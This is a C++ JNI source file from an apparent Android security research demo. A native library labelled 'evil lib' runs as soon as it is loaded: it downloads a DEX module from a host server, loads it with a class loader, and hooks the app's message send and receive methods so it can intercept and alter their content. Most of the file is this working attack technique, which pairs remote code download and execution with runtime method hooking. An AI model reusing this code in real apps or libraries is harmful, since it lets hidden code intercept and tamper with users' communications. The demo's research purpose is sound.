#include <jni.h>
#include <stdlib.h>
#include<string>
#include <string.h>
#include <errno.h>
#include <stdio.h>

#include <sys/mman.h>


#include <sys/stat.h>


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <netdb.h>
#include <sstream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include<memory>

#include <fstream>

#include "Connection.h"
#include "Downloader.h"
#include "Util.h"
#include "EvilModuleProvider.h"
#include "Hook.h"

using namespace std;
using namespace util;



jclass loadClass(jobject loader, const char *, JNIEnv *env) throw(ClassNotFoundException);

Hook* doInBackgroundHook;
Hook* onPostExecuteHook;
static bool hooksAreLoaded = false;
static jclass evilModuleClass = NULL;
static jobject evilModuleClassRef = NULL;
static jobject loaderRef = NULL;

//protected String doInBackground(String... messages)
static jstring doInBackgroundNative(JNIEnv* env, jobject sendTask, jobjectArray messages) {

    logE("doInBackgroundNative", "called!");

    if (doInBackgroundHook->isActivated()) {

        jstring message = NULL;
        if (messages != 0) {
            jint size = env->GetArrayLength(messages);
            if (size != 0) {
                message = (jstring) env->GetObjectArrayElement(messages, 0);
            }
        }

        std::ostringstream ss;
        if (message != NULL)
            ss  << env->GetStringUTFChars(message, NULL);
        ss   << " <<< send message was intercepted by evil lib >>>";

        message = env->NewStringUTF(ss.str().c_str());

        env->SetObjectArrayElement(messages, 0, message);
    }

    jmethodID backup = (jmethodID)doInBackgroundHook->getBackupMethod();

    jclass clazz = env->GetObjectClass(sendTask);
    //doInBackgroundHook->resetHotnessCount(backup);
    short hotnessCount = doInBackgroundHook->getBackupHotnessCount();

    logE("doInBackgroundNative", "hotness count of backup method: %i", hotnessCount);

    return (jstring) env->CallNonvirtualObjectMethod(sendTask, clazz, backup, messages);
}

////void evil.evil_module.EvilModule.onPostExecuteHook(java.lang.String)
static void onPostExecuteNative(JNIEnv* env, jobject sendTask, jstring returnValue) {
    logE("onPostExecuteNative", "called!");

    if (onPostExecuteHook->isActivated()) {
        std::ostringstream ss;
        if (returnValue != NULL) {
            ss  << env->GetStringUTFChars(returnValue, NULL)
                << " <<< received message was intercepted by evil lib >>>";
            returnValue = env->NewStringUTF(ss.str().c_str());
        }
    }

    jmethodID  backup = (jmethodID)onPostExecuteHook->getBackupMethod();
    jclass clazz = env->GetObjectClass(sendTask);
    //onPostExecuteHook->resetHotnessCount(backup);
    env->CallNonvirtualVoidMethod(sendTask, clazz, backup, returnValue);
}


void setupHooks(JNIEnv* env, jclass evilModuleClass) {
    jclass sendTaskClass = env->FindClass(
            "de/unipassau/fim/reallife_security/demoapp/demoapp/SendTask");

    jobject newRef = env->NewGlobalRef(sendTaskClass);
    
    jmethodID doInBackgroundTarget = env->GetMethodID(sendTaskClass,
                                                      "doInBackground",
                                                      "([Ljava/lang/String;)Ljava/lang/String;");

    jmethodID doInBackgroundHookMethod = env->GetMethodID(evilModuleClass,
                                                          "doInBackgroundHook",
                                                          "([Ljava/lang/String;)Ljava/lang/String;");

    jmethodID doInBackgroundBackup = env->GetMethodID(evilModuleClass,
                                                      "doInBackgroundBackup",
                                                      "([Ljava/lang/String;)Ljava/lang/String;");

    jmethodID onPostExecuteTarget = env->GetMethodID(sendTaskClass,
                                                      "onPostExecute",
                                                      "(Ljava/lang/String;)V");

    jmethodID onPostExecuteHookMethod = env->GetMethodID(evilModuleClass,
                                                          "onPostExecuteHook",
                                                          "(Ljava/lang/String;)V");

    jmethodID onPostExecuteBackup = env->GetMethodID(evilModuleClass,
                                                      "onPostExecuteBackup",
                                                      "(Ljava/lang/String;)V");


    try {
        doInBackgroundHook = new Hook(doInBackgroundHookMethod,
                                      doInBackgroundBackup,
                                      doInBackgroundTarget,
                                      (ADDRESS_POINTER) doInBackgroundNative);

        logE("doInBackgroundHookMethod", "%i", doInBackgroundHookMethod);


        doInBackgroundHook->activate(false);
    } catch (HookException e) {
        logE("setupHooks", "Couldn't create doInBackgroundHook: %s", e.what());
    }

    try {
        onPostExecuteHook = new Hook(onPostExecuteHookMethod,
                                     onPostExecuteBackup,
                                     onPostExecuteTarget,
                                     (ADDRESS_POINTER) onPostExecuteNative);


        onPostExecuteHook->activate(false);
    } catch (HookException e) {
        logE("setupHooks", "Couldn't create onPostExecuteHook: %s", e.what());
    }

}

/**
 * Hooks send and receive methods of the benign app
 * @param env The current JNI environment
 */
void doHooking(JNIEnv* env) {

    if (hooksAreLoaded) return;

    string evilModulePath;
    EvilModuleProvider provider(Service ("10.0.2.2", 5050));
    try {
        evilModulePath = provider.downloadEvilModule(env, "EvilModule.dex");
    } catch(DownloadException e) {
        logE("EVIL_LIB::doHooking", "Couldn't download evil module: Cause: %s", e.what());
        return;
    }

    logE("EVIL_LIB::doHooking", "Successfully downloaded evil module: %s", evilModulePath.c_str());


    jobject loader = createDexClassLoader(evilModulePath.c_str(), env);

    if (loader == NULL) {
        logE("EVIL_LIB::doHooking", "Couldn't create dex classloader!");
        return;
    }

    //make a global ref so that gc doesn't interfere
    loaderRef = env->NewGlobalRef(loader);

    try {
        evilModuleClass = loadClass(loader, "evil.evil_module.EvilModule", env);

        //make a global ref so that gc doesn't interfere
        evilModuleClassRef = env->NewGlobalRef(evilModuleClass);

    } catch (ClassNotFoundException e) {
        logE("EVIL_LIB::doHooking", "Couldn't load EvilModule: %s", e.what());
        return;
    }


    logE("EVIL_LIB::doHooking", "Successfully loaded evil module");

    setupHooks(env, evilModuleClass);

    hooksAreLoaded = true;
}


jclass loadClass(jobject loader, const char* className, JNIEnv *env) throw(ClassNotFoundException){

    // Get function ClassLoader.loadClass()
    jclass loaderClass = env->GetObjectClass(loader);
    jmethodID classLoadClass = env->GetMethodID(loaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");

    // load the evil module
    jstring classNameJava = env->NewStringUTF(className);
    jclass evilModuleClass = (jclass) env->CallObjectMethod(loader, classLoadClass, classNameJava);
    evilModuleClass = (jclass) env->NewGlobalRef(evilModuleClass);

    bool evilModuleLoaded = !env->ExceptionCheck();

    if (!evilModuleLoaded) {

        jthrowable exception = env->ExceptionOccurred();
        env->ExceptionClear();
        jstring message = getExceptionMessage(env, exception);

        const char* msg = env->GetStringUTFChars(message, NULL);

        std::string messageObject(msg);
        env->ReleaseStringUTFChars(message, msg);

        ostringstream ss;
        ss << "Couldn't load class: " << messageObject.c_str();
        throw ClassNotFoundException(ss.str());
    }

    return evilModuleClass;
}

extern "C"
JNIEXPORT void JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_activateHookJNI(JNIEnv *env,
                                                                                      jobject instance) {

    if (doInBackgroundHook) doInBackgroundHook->activate(true);
    if (onPostExecuteHook) onPostExecuteHook->activate(true);

}extern "C"
JNIEXPORT void JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_deactivateHookJNI(JNIEnv *env,
                                                                                        jobject instance) {

    if (doInBackgroundHook) doInBackgroundHook->activate(false);
    if (onPostExecuteHook) onPostExecuteHook->activate(false);

}

extern "C"
JNIEXPORT jstring
JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    const char* hello = "Hello from C++";
    return env->NewStringUTF(hello);
}


/**
 * Called when the library is loaded by the benign app.
 * @param vm The JVM
 * @param reserved nothing important
 * @return The current JNI version or -1, if an error occured
 */
jint JNI_OnLoad(JavaVM* vm, void* reserved)
{
    // Get the JNI environment
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return -1;
    }

    // Hook the benign app
    doHooking(env);

    logE("EVIL_LIB::stringFromJNI", "Done");

    return JNI_VERSION_1_6;
}